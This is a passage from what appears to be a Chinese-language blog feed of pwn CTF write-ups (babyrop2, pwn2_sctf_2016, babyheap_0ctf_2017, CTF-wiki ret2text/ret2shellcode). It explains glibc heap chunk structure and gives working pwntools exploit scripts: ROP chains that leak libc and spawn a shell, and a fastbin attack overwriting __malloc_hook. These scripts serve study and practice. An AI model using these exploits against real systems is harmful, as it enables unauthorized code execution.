class="string">&#x27;story!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(binsh)+p64(sys_addr)</span><br><span class="line"></span><br><span class="line">payload +=p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><p>printf 泄露真实地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#p=process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25002</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">format_addr=<span class="number">0x400770</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x000000000040072c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040072e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400730 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400732 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040072b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040072f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004005a0 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400733 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400731 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040072d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004004d1 : ret</span></span><br><span class="line"><span class="string">0x0000000000400532 : ret 0x200a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span>+p64(<span class="number">0x400733</span>)+p64(format_addr)+p64(<span class="number">0x400731</span>)+p64(read_got)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(printf_plt)+p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;name?&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!\n&#x27;</span>)</span><br><span class="line">read_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;read&quot;</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr=libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span>+p64(<span class="number">0x400733</span>)+p64(binsh_addr)+p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn2_sctf_2016"><a class="markdownIt-Anchor" href="#pwn2_sctf_2016">#</a> pwn2_sctf_2016</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29130</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">format_str = <span class="number">0x080486F8</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;read? &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;data!\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p32(printf_plt)+p32(main_addr)+p32(format_str)+p32(printf_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;said: &#x27;</span>)<span class="comment">#这是程序正常输出的</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;said: &#x27;</span>)<span class="comment">#这是printf的那个格式化字符串</span></span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf_addr)</span><br><span class="line">libc_base = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;read? &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;data!\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p32(sys_addr) + p32(main_addr) + p32(str_bin))</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#复制自https://blog.csdn.net/qinying001/article/details/104374305</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./test1&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./test1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> *(<span class="number">0xC8</span>+<span class="number">4</span>) + p32(write_plt)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Welcome!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&quot;read&quot;, read_addr)</span></span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * (<span class="number">0xC8</span>+<span class="number">4</span>) + p32(system_addr)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Welcome!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>babyheap_0ctf_2017</title>
      <link href="/2021/11/15/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
      <url>/2021/11/15/%E5%A0%86%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>堆溢出</p><span id="more"></span><h2 id="malloc_chunk的结构"><a class="markdownIt-Anchor" href="#malloc_chunk的结构">#</a> malloc_chunk 的结构</h2><p>参考文章：<a href="https://blog.csdn.net/weixin_43847969/article/details/104897249">https://blog.csdn.net/weixin_43847969/article/details/104897249</a></p><p><img src="https://img-blog.csdnimg.cn/20200316131506363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt=""></p><p>pre_size:</p><p>这个参数分两种情况，一种情况记录大小，一种情况记录数据<br>当前一个 chunk 的状态是空闲时记录大小（也就是被 free 的时候），<br>当前一个 chunk 的状态不是空闲的时候，记录它的数据。<br>然后是</p><p>size：</p><p>就是这个 chunk 的大小，size 的最后 3 个比特位对大小没有影响，但是要表示了一些东西<br>分别是 non_main_arena : 记录当前 chunk 是否属于主线程<br> is_mapped：当前 chunk 是否由 mmap 分配<br> prev_inuse：记录前一个 chunk 是否被分配（这个最重要，因为我们当这个参数为 0 时，我们能够通过它获得上一个 chunk 的大小和地址）</p><p>fd,bk:</p><p>表示用户数据，或者表示地址<br> chunk 非空闲时，fd 和 bk 存在的地方表示的是用户的数据，<br>chunk 空闲时，fd 存储下一个空闲的 chunk，bk 指向上一个空闲的 chunk，这个非物理相邻表示的意思是，这个上一个和下一个表示的是被 free 的顺序，而不是地址上的相邻。</p><h2 id="chunk的结构"><a class="markdownIt-Anchor" href="#chunk的结构">#</a> chunk 的结构</h2><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111150944434.png" alt="在这里插入图片描述"></p><p>第一个是 size of previous（前一个 chunk 的大小，如果前一个 chunk 空闲的话）<br>第二个 size of chunk 当前 chunk 的大小，然后再末尾有 3 个比特位 amp 分别代表上面介绍过的 3 个参数<br>第三个就是存储数据的部分<br>然后就到了下一个 chunk (next_chunk)，我们把这个 next_chunk 称为 chunk2, 上面的 chunk 称为 chunk1，可以看到如果 chunk1 正在使用的话，那么 chunk 的头部位置，也就是 prev_size，会被 chunk1 使用<br>然后 chunk2 的第二行的后三个比特位也分别是 A01，A 代表着是否属于主线程（这里我们不知道所以用 A 代替），0 代表着当前 chunk 不是由 mmap 分配，1 代表着前一个 chunk 已经被分配。</p><p>chunk 被 free 后结构变化：</p><p><img src="https://img-blog.csdnimg.cn/20200316134429623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>第一行，没变化，因为它是 chunk1<br> 第二行开始，M 的位置变成了 0，代表着 chunk 不是由 mmap 分配<br>第三行开始，原本存储数据的部分变成了 forward pointer to next chunk in list<br> 也就是 fd，前面已经介绍过了，这个地方如果被使用的时候是数据，如果被 free 了，那么就存储的是下一个空闲的 chunk，下面的 back pointer to previous chunk in list（bk）同理.<br> 然后就到了 unused space，（maybe 0 bytes long），没有使用过的空间，这时候应该被收集到各种 bin 中去。<br>然后就到了 chunk2, 第一行记录当前 chunk 的大小，（并且不会被前一个 chunk 占用）<br>第二行记录前一个 chunk 的大小，并且末尾三位变成了 A00,（这时候如果这个是堆中第一个被分配的 chunk 的话我们能通过 prev_size 字段获取上一个 chunk 的大小以及地址。）<br><img src="https://img-blog.csdnimg.cn/20200316135249139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>chunk 的空间复用：</p><p><img src="https://img-blog.csdnimg.cn/20200316133135882.png" alt="在这里插入图片描述"></p><h2 id="bin及分类"><a class="markdownIt-Anchor" href="#bin及分类">#</a> bin 及分类</h2><p><img src="https://img-blog.csdnimg.cn/20200316135544629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="fast-bins"><a class="markdownIt-Anchor" href="#fast-bins">#</a> fast bins</h3><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111150958166.png" alt="在这里插入图片描述"></p><h3 id="small-bins"><a class="markdownIt-Anchor" href="#small-bins">#</a> small bins</h3><h3 id="large-bins"><a class="markdownIt-Anchor" href="#large-bins">#</a> large bins</h3><h3 id="unsorted-bins"><a class="markdownIt-Anchor" href="#unsorted-bins">#</a> unsorted bins</h3><p>未被分类，刚被 free 未真的进入 bin</p><p>Top Chunk</p><p><img src="https://img-blog.csdnimg.cn/20200316140527864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="babyheap_0ctf_2017"><a class="markdownIt-Anchor" href="#babyheap_0ctf_2017">#</a> babyheap_0ctf_2017</h1><p>考点： fastbin attack</p><h2 id="利用思路"><a class="markdownIt-Anchor" href="#利用思路">#</a> 利用思路</h2><p>两次 double free 与 fastbin attack 。<br>第一次先泄露 libc 地址，然后找到构造 fake chunk 的地址。<br>第二次通过构造的 fake chunk 堆溢出覆写 __malloc_hook 完成 get shell 。</p><h2 id="利用过程"><a class="markdownIt-Anchor" href="#利用过程">#</a> 利用过程</h2><p>1、通过 unsortedbin attack 来泄露 libc 地址</p><p>首先应该记住这样一条规律：当 small chunk 被释放时，它的 fd、bk 指向一个指针，这个指针指向 top chunk 地址，这个指针保存在 main_arena 的 0x58 偏移处，而 main_arena 是 libc 的 data 段中，是全局静态变量，所以偏移也是固定的，根据这些就可以计算出 libc 的基地址了，所以<em><strong>重点是当 small chunk 释放时，能读出 fd 或者 bk 的值</strong></em></p><p>我首先通过如下重叠两个块来泄漏 libc 的地址（也是常见的攻击）。<br><img src="https://img-blog.csdnimg.cn/20201002095257731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29370</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./babyheap&#x27;)</span></span><br><span class="line">p.readuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">a</span>):</span><br><span class="line">    p.writeline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line">    <span class="comment">#p.readuntil(&#x27;Command:&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    p.writeline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(b))</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">    p.write(c)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">a</span>):  </span><br><span class="line">    p.writeline(<span class="string">&#x27;3&#x27;</span>)   </span><br><span class="line">    p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">a</span>):</span><br><span class="line">    p.writeline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x18</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x68</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x68</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x91</span>)) <span class="comment">#size1+size2</span></span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#1    #free1</span></span><br><span class="line">alloc(<span class="number">0x18</span>)   <span class="comment">#alloc1</span></span><br><span class="line">show(<span class="number">2</span>)     <span class="comment">#fd, bk at alloc2</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">malloc_hook = libcbase + <span class="number">0x3c4aed</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">one = libcbase + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)  <span class="comment">#free2</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">update(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook))   <span class="comment">#fd at 2-&gt;malloc_hook</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x68</span>)  <span class="comment">#2</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">alloc(<span class="number">0x68</span>)  <span class="comment">#4 at malloc_hook</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">4</span>, <span class="number">0x1b</span>, p8(<span class="number">2</span>)*<span class="number">3</span>+p64(<span class="number">2</span>)*<span class="number">2</span>+p64(one))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">alloc(<span class="number">255</span>) </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-WIKI-pwn-基本ROP 漏洞复现</title>
      <link href="/2021/11/11/ROP/"/>
      <url>/2021/11/11/ROP/</url>
      
        <content type="html"><![CDATA[<h1 id="基本rop"><a class="markdownIt-Anchor" href="#基本rop">#</a> 基本 ROP</h1><span id="more"></span><h2 id="ret2text"><a class="markdownIt-Anchor" href="#ret2text">#</a> ret2text</h2><p>首先检查程序的保护机制。</p><p><img src="https://img-blog.csdnimg.cn/2019022710543258.png" alt="img"></p><p>关于各个保护机制的介绍 :<a href="https://www.cnblogs.com/Spider-spiders/p/8798628.html">https://www.cnblogs.com/Spider-spiders/p/8798628.html</a></p><p>看到只开启了 NX 保护，即不可在栈上执行代码。</p><p>使用 IDA 查看源码，可以看到这里有一个危险的 gets 函数</p><p><img src="https://img-blog.csdnimg.cn/20190227111810747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>以及这里有一个 system 函数</p><p><img src="https://img-blog.csdnimg.cn/20190227111904256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227111935558.png" alt="img"></p><p>所以如果能直接返回到 0x804863A，即可执行该函数。</p><p>在 GDB 中对 main 函数里的 gets 函数下断点。</p><p><img src="https://img-blog.csdnimg.cn/20190227112321284.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227112412951.png" alt="img"></p><p>可以看到，存储局部变量 s (eax) 位于 esp 中存储</p><p>查看 esp 和 ebp 得知</p><p><img src="https://img-blog.csdnimg.cn/201902271125369.png" alt="img"></p><p>s 的地址为 0xffffcecc</p><p>ebp 地址为 0xffffcf38</p><p><img src="https://img-blog.csdnimg.cn/20190227112810664.png" alt="img"></p><p>两者距离 108 个字节</p><p>所以 108+4=112 即为返回地址的地址。(因为没有开启 canary，ebp 上就是返回地址的值了。)</p><p><img src="https://img-blog.csdnimg.cn/20190227113810258.png" alt="img"></p><p>python 脚本，我会给出注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>) <span class="comment">#本地链接到文件</span></span><br><span class="line">target = <span class="number">0x804863a</span> <span class="comment">#执行system(&#x27;/bin/sh&#x27;)函数的地址</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> + p32(target)) <span class="comment"># 112是上面计算出来的s距离返回地址的字节距离</span></span><br><span class="line">sh.interactive() <span class="comment">#进行交互</span></span><br></pre></td></tr></table></figure><h2 id="ret2shellcode"><a class="markdownIt-Anchor" href="#ret2shellcode">#</a> ret2shellcode</h2><p>先检查程序的保护机制</p><p><img src="https://img-blog.csdnimg.cn/20190227164142987.png" alt="img"></p><p>全部关闭，并且通过 RELRO 为 Partial 部分模式，得知程序存在存在可读可写可执行段。</p><p><img src="https://img-blog.csdnimg.cn/20190227164305727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>通过 IDA 观察得知，这次同样使用不安全的 gets 输入，并且将输入完的值拷贝至 buf2，观察 buf2 是什么样的一块内存。</p><p><img src="https://img-blog.csdnimg.cn/20190227164359894.png" alt="img"></p><p>buf 是一块位于 bss 段的可读可写可执行段。所以泄露思路为:</p><p>将 shellcode 拷贝至 buf2 里，然后通过堆栈溢出将函数返回到执行 buf2 即可。</p><p>在 gets 函数处下断点</p><p><img src="https://img-blog.csdnimg.cn/20190227165108812.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227165123143.png" alt="img"></p><p>得知 s 地址为 0xffffcecc，ebp 地址为 0xffffcf38</p><p>ebp+4 即为函数返回地址。</p><p>所以 0xcf38-0xcecc+4 即为 s 与返回地址之间的字节距离。</p><p>写 python 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;ret2shellcode&#x27;</span> <span class="comment">#全局自动设置架构类型与os类型</span></span><br><span class="line">sh=process(<span class="string">&#x27;./ret2shellcode&#x27;</span>) <span class="comment">#本地连接</span></span><br><span 